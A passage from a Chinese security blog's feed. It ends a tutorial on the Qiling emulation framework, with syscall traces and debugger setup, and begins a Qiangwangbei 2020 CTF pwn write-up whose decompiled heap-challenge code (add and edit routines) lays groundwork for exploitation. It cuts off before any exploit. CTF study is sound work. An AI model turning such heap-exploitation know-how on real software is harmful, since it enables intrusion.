operator">/</span>ld<span class="token punctuation">.</span>so<span class="token punctuation">.</span>preload<span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>etc<span class="token operator">/</span>ld<span class="token punctuation">.</span>so<span class="token punctuation">.</span>cache<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>tls<span class="token operator">/</span>i686<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">stat64</span><span class="token punctuation">(</span><span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>tls<span class="token operator">/</span>i686<span class="token punctuation">,</span> <span class="token number">0x7ff3c360</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>tls<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">stat64</span><span class="token punctuation">(</span><span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>tls<span class="token punctuation">,</span> <span class="token number">0x7ff3c360</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>i686<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">stat64</span><span class="token punctuation">(</span><span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>i686<span class="token punctuation">,</span> <span class="token number">0x7ff3c360</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">stat64</span><span class="token punctuation">(</span><span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token punctuation">,</span> <span class="token number">0x7ff3c360</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>tls<span class="token operator">/</span>i686<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">stat64</span><span class="token punctuation">(</span><span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>tls<span class="token operator">/</span>i686<span class="token punctuation">,</span> <span class="token number">0x7ff3c360</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>tls<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">stat64</span><span class="token punctuation">(</span><span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>tls<span class="token punctuation">,</span> <span class="token number">0x7ff3c360</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>i686<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">stat64</span><span class="token punctuation">(</span><span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>i686<span class="token punctuation">,</span> <span class="token number">0x7ff3c360</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">stat64</span><span class="token punctuation">(</span><span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>mipsel<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token punctuation">,</span> <span class="token number">0x7ff3c360</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>lib<span class="token operator">/</span>tls<span class="token operator">/</span>i686<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">stat64</span><span class="token punctuation">(</span><span class="token operator">/</span>lib<span class="token operator">/</span>tls<span class="token operator">/</span>i686<span class="token punctuation">,</span> <span class="token number">0x7ff3c360</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>lib<span class="token operator">/</span>tls<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">stat64</span><span class="token punctuation">(</span><span class="token operator">/</span>lib<span class="token operator">/</span>tls<span class="token punctuation">,</span> <span class="token number">0x7ff3c360</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>lib<span class="token operator">/</span>i686<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">stat64</span><span class="token punctuation">(</span><span class="token operator">/</span>lib<span class="token operator">/</span>i686<span class="token punctuation">,</span> <span class="token number">0x7ff3c360</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">openat</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">/</span>lib<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 0o0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x7ff3c4ac</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">512</span><span class="token function">prctl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token function">_llseek</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x208</span><span class="token punctuation">,</span> <span class="token number">0x7ff3c238</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token function">_llseek</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x208</span><span class="token punctuation">,</span> <span class="token number">0x7ff3c238</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x7ff3c278</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">36</span><span class="token function">_llseek</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x33c</span><span class="token punctuation">,</span> <span class="token number">0x7ff3c210</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token function">_llseek</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x33c</span><span class="token punctuation">,</span> <span class="token number">0x7ff3c210</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x7ff3c250</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token function">fstat64</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x7ff3c368</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token function">mmap2</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x191030</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x2002</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x774c1000</span><span class="token function">mprotect</span><span class="token punctuation">(</span><span class="token number">0x7763a000</span><span class="token punctuation">,</span> <span class="token number">0xf000</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token function">mmap2</span><span class="token punctuation">(</span><span class="token number">0x77649000</span><span class="token punctuation">,</span> <span class="token number">0x7000</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x2012</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1540096</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x77649000</span><span class="token function">mmap2</span><span class="token punctuation">(</span><span class="token number">0x77650000</span><span class="token punctuation">,</span> <span class="token number">0x2030</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x812</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x77650000</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token function">set_thread_area</span><span class="token punctuation">(</span><span class="token number">0x774c7230</span><span class="token punctuation">)</span><span class="token function">mprotect</span><span class="token punctuation">(</span><span class="token number">0x77649000</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token function">mprotect</span><span class="token punctuation">(</span><span class="token number">0x410000</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token function">mprotect</span><span class="token punctuation">(</span><span class="token number">0x47ed000</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token function">fstat64</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x7ff3c7b0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token function">brk</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token function">brk</span><span class="token punctuation">(</span><span class="token number">0x435000</span><span class="token punctuation">)</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">414150</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>Hello <span class="token function">worldexit_group</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>非常详细的系统调用</p><p>接下来我们跟进到<code>Qiling</code>这个类里面</p><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Qiling</span><span class="token punctuation">(</span>QlCoreStructs<span class="token punctuation">,</span> QlCoreHooks<span class="token punctuation">,</span> QlCoreUtils<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>            self<span class="token punctuation">,</span>            filename<span class="token operator">=</span>None<span class="token punctuation">,</span>            rootfs<span class="token operator">=</span>None<span class="token punctuation">,</span>            env<span class="token operator">=</span>None<span class="token punctuation">,</span>            shellcoder<span class="token operator">=</span>None<span class="token punctuation">,</span>            ostype<span class="token operator">=</span>None<span class="token punctuation">,</span>            archtype<span class="token operator">=</span>None<span class="token punctuation">,</span>            bigendian<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>            output<span class="token operator">=</span>None<span class="token punctuation">,</span>            verbose<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>            profile<span class="token operator">=</span>None<span class="token punctuation">,</span>            console<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>            log_dir<span class="token operator">=</span>None<span class="token punctuation">,</span>            log_split<span class="token operator">=</span>None<span class="token punctuation">,</span>            append<span class="token operator">=</span>None<span class="token punctuation">,</span>            libcache <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>            stdin<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>            stdout<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>            stderr<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">:</span></code></pre><p>可选的参数有很多，不过大部分情况下我们需要操作的只有<code>filename</code>、<code>rootfs</code>、<code>output</code>以及在模拟路由器中我们需要设置的<code>env</code></p><p>在这个脚本里我们的文件是当前目录下的hello，库文件目录为<code>/usr/mipsel-linux-gnu</code></p><p>接下来我们开启qiling的远程调试，使用gdb调试这个小程序</p><p>要开启调试功能，只需要在<code>ql.run()</code>前加一个<code>ql.debugger=True</code>,这样默认绑定9999端口，或者使用<code>ql.debugger=‘:9999’</code>,这样绑定会<code>0.0.0.0:9999</code></p><p>这里贴上官方的文档</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token keyword">from</span> qiling <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">mysandbox</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>rootfs<span class="token punctuation">)</span><span class="token punctuation">:</span>    ql<span class="token operator">=</span>Qiling<span class="token punctuation">(</span>path<span class="token punctuation">,</span>rootfs<span class="token punctuation">,</span>output<span class="token operator">=</span><span class="token string">'default'</span><span class="token punctuation">)</span>    ql<span class="token punctuation">.</span>debugger <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token comment" spellcheck="true"># You can also customize address &amp; port or type of debugging server</span>    <span class="token comment" spellcheck="true"># ql.debugger= ":9999"  # GDB server listens to 0.0.0.0:9999</span>    <span class="token comment" spellcheck="true"># ql.debugger = "127.0.0.1:9999"  # GDB server listens to 127.0.0.1:9999</span>    <span class="token comment" spellcheck="true"># ql.debugger = "gdb:127.0.0.1:9999"  # GDB server listens to 127.0.0.1:9999</span>    <span class="token comment" spellcheck="true"># ql.debugger = "idapro:127.0.0.1:9999"  # IDA pro server listens to 127.0.0.1:9999</span>    ql<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    mysandbox<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'/usr/mipsel-linux-gnu'</span><span class="token punctuation">)</span></code></pre><p>不过个人感觉qiling的调试很慢，ni一下要等好几秒，也可能是我的操作不当，所以我一般调试还是用qemu</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/qilingframework/qiling&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;qiling&lt;/a&gt;框架能够做到&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;麒麟框架不仅仅是一个仿真平台或逆向
      
    
    </summary>
    
    
      <category term="IOT" scheme="https://lawliet.ren/categories/IOT/"/>
    
    
      <category term="qiling" scheme="https://lawliet.ren/tags/qiling/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2020</title>
    <link href="https://lawliet.ren/2020/08/29/qiang-wang-bei-2020/"/>
    <id>https://lawliet.ren/2020/08/29/qiang-wang-bei-2020/</id>
    <published>2020-08-29T01:54:31.000Z</published>
    <updated>2020-08-31T00:30:49.223Z</updated>
    
    <content type="html"><![CDATA[<p>强网杯2020的pwn题多且质量高，非常有必要复现一部分</p><h3 id="0x1-easypwn"><a href="#0x1-easypwn" class="headerlink" title="0x1.easypwn"></a>0x1.easypwn</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_ACE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>  v1 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">mallopt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v1<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><a id="more"></a><p>禁用了fastbin</p><p>一共有三个功能，add，dele和edit，先看到add</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>  size_t size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">></span> <span class="token number">19</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">==</span> <span class="token number">20</span> <span class="token punctuation">)</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>qword_202500<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">LODWORD</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>size <span class="token operator">></span> <span class="token number">0x3F0</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  qword_202500<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>qword_202500<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  qword_202060<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>size<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>最多能分配20个chunk，最大能分配的size为0x3f0</p><p>再看到edit</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0x13</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span 